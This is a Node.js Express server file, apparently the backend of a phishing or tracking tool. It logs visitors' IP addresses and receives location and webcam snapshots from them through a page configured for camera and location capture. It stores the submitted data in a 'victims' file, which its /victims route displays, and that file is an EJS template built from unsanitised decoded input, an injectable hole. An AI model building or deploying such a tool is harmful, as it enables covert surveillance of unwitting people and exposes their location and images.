const fs = require("fs");
const path = require("path");
const express = require("express");
var bodyParser = require("body-parser");
const base64ToImage = require("base64-to-image");
const config = require("./app").config;

var jsonParser = bodyParser.json({
  limit: 1024 * 1024 * 20,
  type: "application/json",
});
var urlencodedParser = bodyParser.urlencoded({
  extended: true,
  limit: 1024 * 1024 * 20,
  type: "application/x-www-form-urlencoded",
});

const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(express.static("public"));
app.set("view engine", "ejs");

// ✅ Helper: safe log path
function getLogPath(filename) {
  if (process.env.VERCEL) {
    return path.join("/tmp", filename);
  } else {
    return path.join(process.cwd(), "views", filename);
  }
}

app.get("/", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");

  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  res.render("index", {
    ip: ip,
    time: d,
    redirect: config.redirectURL,
    camera: config.camera,
    cams: config.camsnaps,
    location: config.location,
  });

  const logFile = getLogPath("log.txt");

  // Ensure file exists before writing
  if (!fs.existsSync(logFile)) {
    fs.writeFileSync(logFile, "");
  }

  fs.appendFile(logFile, `Visit Form: ${ip} | At: ${d}\n\n`, function (err) {
    if (err) console.error("Log write error:", err);
  });
});

app.get("/victims", (req, res) => {
  res.render("victims");
});

app.post("/", (req, res) => {
  const victimsFile = getLogPath("victims.ejs");

  if (!fs.existsSync(victimsFile)) {
    fs.writeFileSync(victimsFile, "");
  }

  fs.appendFile(victimsFile, decodeURIComponent(req.body.data) + "\n\n", function (err) {
    if (err) {
      console.error("Victims write error:", err);
      return res.status(500).send("Error saving data");
    }
    console.log("Saved!");
    res.send("Done");
  });
});

app.post("/camsnap", (req, res) => {
  const imgPath = "./public/images/";
  const { fileName } = base64ToImage(decodeURIComponent(req.body.img), imgPath, { type: "png" });
  res.send(fileName);
});

app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});
